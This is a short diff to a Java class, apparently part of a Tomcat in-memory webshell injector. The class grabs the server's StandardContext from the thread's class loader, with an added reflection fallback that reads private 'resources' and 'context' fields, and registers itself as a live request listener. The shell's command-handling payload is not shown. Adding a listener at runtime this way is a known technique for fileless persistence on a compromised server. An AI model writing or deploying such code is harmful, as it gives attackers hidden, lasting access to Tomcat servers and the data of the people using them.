@@ -22,7 +22,20 @@ public class TLMSFromThreadLi implements ServletRequestListener {
         try {
             // 获取 standardContext
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            StandardContext       standardContext;
+
+            try {
+                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+            } catch (Exception ignored) {
+                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
+                field.setAccessible(true);
+                Object root   = field.get(webappClassLoaderBase);
+                Field  field2 = root.getClass().getDeclaredField("context");
+                field2.setAccessible(true);
+
+                standardContext = (StandardContext) field2.get(root);
+            }
 
             TLMSFromThreadLi listener = new TLMSFromThreadLi();
             standardContext.addApplicationEventListener(listener);
